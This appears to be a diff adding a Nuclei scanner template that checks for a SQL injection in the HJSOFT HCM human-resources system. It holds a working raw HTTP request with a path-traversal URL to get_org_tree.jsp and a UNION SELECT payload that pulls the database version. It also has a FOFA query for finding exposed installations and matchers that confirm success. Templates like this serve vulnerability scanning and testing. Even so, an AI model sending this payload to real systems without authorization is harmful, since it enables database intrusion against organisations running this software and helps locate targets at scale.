@@ -1,0 +1,35 @@
+id: Hongjinrenli-get_org_tree-Sql
+
+info:
+  name: 宏景人力-get_org_tree-sql注入
+  author: candada
+  severity: high
+  description: description
+  reference:
+    - https://
+  metadata:
+    fofa-query: app="HJSOFT-HCM"
+  tags: sqli
+
+http:
+  - raw:
+      - |-
+        POST /templates/attestation/../../kq/app_check_in/get_org_tree.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-agent: Opera/9.64 (Windows NT 6.0; U; zh-cn) Presto/2.1.1
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+
+        params=1=0 union select 1,@@version,'hjsoft',4--+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - SQL Server
+      - type: status
+        status:
+          - 200
